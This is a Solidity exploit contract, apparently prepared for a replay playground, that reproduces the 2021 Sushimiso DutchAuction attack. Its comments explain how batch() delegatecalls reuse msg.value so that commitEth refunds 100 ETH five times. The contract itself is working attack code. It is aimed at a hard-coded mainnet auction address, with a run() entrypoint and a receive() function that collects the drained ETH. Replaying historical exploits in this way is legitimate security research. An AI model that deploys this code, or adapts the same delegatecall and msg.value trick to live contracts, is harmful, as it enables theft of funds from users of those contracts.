// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2021-09-Sushimiso).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest IS the attacker: it builds the batch payload, attaches 100 ETH,
// and exposes a `receive()` that swallows the refunds). There is no standalone
// contract to deploy, so we hand-author this self-contained contract that
// faithfully copies the inline attack (testExploit body → run() + receive()).
// Logic and constants are copied verbatim from test/Sushimiso_exp.sol.
//
// Root cause: DutchAuction inherits BoringBatchable, whose public `batch()`
// runs each supplied calldata through `address(this).delegatecall(...)` in a
// loop. DELEGATECALL preserves the caller's `msg.value`, so every iteration
// re-exposes the SAME msg.value. commitEth() refunds `msg.value - committed`
// to the beneficiary; with the auction already full (commit==0), each of the 5
// iterations refunds the full 100 ETH. The attacker attaches 100 ETH once but
// receives 5 x 100 = 500 ETH — the 400 ETH surplus is drained straight out of
// the auction's own committed ETH balance.

interface IDutchAuction {
    // commitEth.selector == 0x29762960
    function commitEth(address payable _beneficiary, bool readAndAgreed) external payable;

    function batch(bytes[] calldata calls, bool revertOnFail)
        external
        payable
        returns (bool[] memory successes, bytes[] memory results);
}

contract SushimisoBatch {
    // The live MISO DutchAuction (an EIP-1167 proxy delegating to the
    // implementation that actually holds the batch/commitEth logic).
    address constant DUTCH_AUCTION = 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e;

    // The single funding amount (mirrors the PoC). The auction is full, so the
    // whole amount is refunded on every batch iteration; its size sets the
    // per-iteration theft. Profit = (N - 1) * MSG_VALUE.
    uint256 constant MSG_VALUE = 100 ether;
    // Number of batched commitEth calls. 5 yields 4 * 100 = 400 ETH.
    uint256 constant BATCH_LEN = 5;

    // Entrypoint (the recorded attack). The contract must hold MSG_VALUE before
    // this runs (it is seeded in setup); it spends its own balance on batch.
    function run() external {
        // ABI-encode commitEth(address(this), true) with packed uint256 args,
        // exactly as the original test does.
        bytes memory payload = abi.encodePacked(
            IDutchAuction.commitEth.selector,
            uint256(uint160(address(this))),
            uint256(uint8(0x01))
        );
        bytes[] memory calls = new bytes[](BATCH_LEN);
        for (uint256 i = 0; i < BATCH_LEN; i++) {
            calls[i] = payload;
        }
        // One transaction, MSG_VALUE attached once. Each inner delegatecall to
        // commitEth re-sees msg.value = MSG_VALUE and refunds it in full.
        IDutchAuction(DUTCH_AUCTION).batch{value: MSG_VALUE}(calls, true);
    }

    // Accepts the per-iteration refunds from commitEth's _beneficiary.transfer.
    receive() external payable {}
}
